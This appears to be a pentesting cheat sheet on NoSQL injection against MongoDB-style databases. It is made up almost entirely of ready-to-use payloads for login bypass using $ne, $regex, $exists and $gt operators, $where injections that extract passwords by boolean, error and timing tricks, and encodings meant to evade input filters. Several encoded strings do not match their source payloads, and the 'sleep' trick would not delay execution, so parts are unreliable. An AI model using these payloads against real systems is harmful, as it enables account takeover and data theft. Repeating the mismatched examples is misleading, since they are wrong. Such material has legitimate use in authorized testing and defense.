# NoSQL Injections
- This Can Be Found In Every Query Made To The DataBase

# NoSQL Injection

### Auth Bypass

```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### Types

**Boolean Based :** 

```bash
{"$where": "this.username=='admin' && this.password.match(/^pa/)"}
```

**Error-based injection:**

```bash
{"$where": "db.collection.find({}).limit(1).forEach(function(x){return x.username}).toString().match(/./) && this.password.match(/^pa/)"}
```

**Time Based Injection :** 

```bash
{"$where": "function sleep(ms){return new Promise(resolve=>setTimeout(resolve,ms));} for(var i=0;i<50000;i++){sleep(10);} this.username=='admin' && this.password.match(/^pa/)"}
```

## Filter Bypass

**URL encoding :**

This technique encodes the payload by replacing special characters with their corresponding hexadecimal values.

```bash
{$where:{username:'admin',password:'password'}}
 #can be encoded as 
%7B%24where%3A%7Busername%3A%27admin%27%2Cpassword%3A%27password%27%7D%7D
```

**Base64 encoding:**

This technique encodes the payload by converting the payload to a base64 string

```bash
{$where:{username:'admin',password:'password'}}
eyJ3aGVyZSI6eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJwYXNzd29yZCJ9fQ==
```

**Double URL encoding:** 

This technique applies URL encoding twice to the payload, making it more difficult to detect.

```bash
{username:'admin',password:'password'}}
can be encoded as
 %257B%2524where%253A%257Busername%253A%2527admin%2527%252Cpassword%253A%2527password%2527%257D%257D
```

**Hex encoding:** 

This technique encodes the payload by converting the payload to its hexadecimal representation.

```bash
{username:'admin',password:'password'}}
# can be encoded as
7b2477686572653a7b757365726e616d653a2741646d696e272c70617373776f72643a2770617373776f7264277d7d
```

**Unicode encoding:** 

This technique encodes the payload by converting the payload to its Unicode representation.

```bash
{$where:{username:'admin',password:'password'}} 
can be encoded as 
\u007B\u0024\u0077\u0068\u0065\u0072\u0065\u003A\u007B\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0027\u0061\u0064\u006D\u0069\u006E\u0027\u002C\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0027\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0027\u007D\u007D
```
